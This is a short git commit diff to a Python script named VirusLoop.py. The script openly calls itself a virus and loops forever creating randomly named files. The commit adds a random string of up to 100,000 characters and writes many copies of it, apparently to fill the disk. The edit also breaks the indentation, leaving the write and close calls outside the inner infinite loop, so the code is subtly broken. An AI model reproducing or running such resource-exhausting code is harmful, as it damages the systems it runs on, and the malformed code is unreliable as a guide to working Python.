71a89ede99797ceb150e86ddb8d496d2b19b96e2
justsomerandomkname <82386934+justsomerandomkname@users.noreply.github.com>
2021-06-15 09:29:11 -0400

    Update VirusLoop.py

--- VirusLoop.py
+++ VirusLoop.py
@@ -7,7 +7,10 @@ while 1:
 length_of_string = random.choice(range(1, 100))
 random_string = "".join(random.choice(string.ascii_letters) for i in range(length_of_string))
 
+length_of_string2 = random.choice(range(1, 100000))
+random_string2 = "".join(random.choice(string.ascii_letters) for i in range(length_of_string2))
+
 while 1:
-    f = open(random_string, "w+")
-    f.write("VIRUS")
-    f.close()
+  f = open(random_string, "w+")
+f.write(random_string2+'\n'+random_string2+random_string2+'\n'+random_string2+random_string2+'\n'+random_string2+random_string2+'\n'+random_string2+random_string2+'\n'+random_string2)
+f.close()
